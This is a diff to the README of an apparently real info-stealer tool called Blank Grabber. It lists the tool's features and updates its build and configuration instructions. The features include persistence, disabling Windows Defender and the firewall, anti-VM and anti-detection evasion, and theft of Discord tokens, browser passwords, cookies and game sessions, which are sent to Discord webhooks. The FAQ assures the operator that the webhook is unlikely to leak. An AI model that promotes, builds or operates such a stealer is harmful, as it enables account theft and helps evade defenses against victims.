@@ -11,16 +11,16 @@ _*Requires Python 3*_
     3) Runs On Startup.
     4) Disables Windows Defender and Firewall.
     5) Anti-VM.
-	6) Hide Itself.
+    6) Hide Itself.
     7) Better Obfuscation.
     8) Anti-Unpacking Technique.
-	9) Anti-UPX Detection by YARA.
+    9) Anti-UPX Detection by YARA.
     10) Anti-Pyinstaller Detection by YARA.
     11) Grabs Discord Tokens.
     12) Grabs Passwords from most browsers.
     13) Grabs Chrome Cookies.
-	14) Grabs Minecraft Session.
-	15) Grabs Roblox Cookies.
+    14) Grabs Minecraft Session.
+    15) Grabs Roblox Cookies.
     16) Grabs IP Information.
     17) Grabs System Info.
     18) Captures Screenshot.
@@ -28,9 +28,7 @@ _*Requires Python 3*_
     20) Sends All Data Through Discord Webhooks.
     (...more)
 
-**Note:** Follow the instructions carefully, otherwise the grabber would not be created!
-
-**Note:** Some customisable options can be found inside [main.py](https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Data/main.py#L5-L9) file.
+**Note:** Some customisable options can be found inside [config.json](https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Data/config.json) file.
 
 ## Frequently Asked Questions
 
@@ -38,7 +36,7 @@ _*Requires Python 3*_
 > *The approximate file size should be around 7.80 MB.*
 
 **2) How can I change the icon?**
-> *Place a file named "icon.ico" (the format must be correct) in the same folder as the other files.*
+> *Place a file named "icon.ico" (the format must be correct) in the Data folder before building (or in the `env\Scripts` folder if it exists).*
 
 **3) Can my webhook get leaked?**
 > *There is a very low chance that your webhook is going to be found.*
